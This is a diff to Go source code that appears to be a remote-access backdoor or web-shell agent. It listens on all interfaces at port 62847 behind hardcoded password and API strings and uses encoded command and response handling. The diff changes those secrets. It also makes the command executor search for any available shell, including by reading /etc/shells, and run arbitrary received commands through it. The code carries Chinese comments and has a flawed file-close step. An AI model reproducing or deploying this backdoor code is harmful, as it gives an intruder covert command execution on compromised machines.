@@ -21,8 +21,8 @@ import (
 )
 
 const LISTEN = "0.0.0.0:62847"
-const PWD = "AQNXYUASEDFLVBWSFWECSSV"
-const API = "XCVBRTSDBAVWERHHWARTGJR"
+const PWD = "S1lLyAQNXYUASEDFLVBWSFWECSSVS1lLy"
+const API = "S1lLyXCVBRTSDBAVWERHHWARTGJRS1lLy"
 const ENCODER = "base64"           // "" or "base64" or "hex"
 const RETURN_ENCODE = "hex_base64" // "" or "base64" or "hex" or "hex_base64"
 const OUT_PREFIX = "->|"           // 数据分割前缀符
@@ -306,11 +306,48 @@ func WgetCode(url string, savepath string) string {
 
 func ExecuteCommandCode(cmdPath string, command string) string {
 	var out []byte
-	switch runtime.GOOS {
-	case "darwin", "linux":
-		cmd := exec.Command("/bin/bash", "-c", command)
-		out, _ = cmd.CombinedOutput()
+	shell := ""
+	sh1, err := os.Stat("/bin/bash")
+	if err == nil {
+		shell = sh1.Name()
+	} else {
+		sh2, err2 := os.Stat("/bin/sh")
+		if err2 == nil {
+			shell = sh2.Name()
+		} else {
+			sh3, err3 := os.Stat("/bin/zsh")
+			if err3 == nil {
+				shell = sh3.Name()
+			} else {
+				sh4, err4 := os.Stat("/bin/psh")
+				if err4 == nil {
+					shell = sh4.Name()
+				} else { //还是没有能用的shell
+					fi, err5 := os.Open("/etc/shells")
+					if err5 != nil {
+						shell = "sh"
+					}
+					defer fi.Close()
+					br := bufio.NewReader(fi)
+					for {
+						line, _, c := br.ReadLine()
+						if c == io.EOF {
+							break
+						}
+						if strings.Index(strings.TrimSpace(string(line)), "#") == 0 {
+							continue
+						} else {
+							shell = strings.TrimSpace(string(line))
+							break
+						}
+					}
+				}
+			}
+		}
 	}
+	cmd := exec.Command(shell, "-c", command)
+	out, _ = cmd.CombinedOutput()
+
 	return string(out)
 }
 
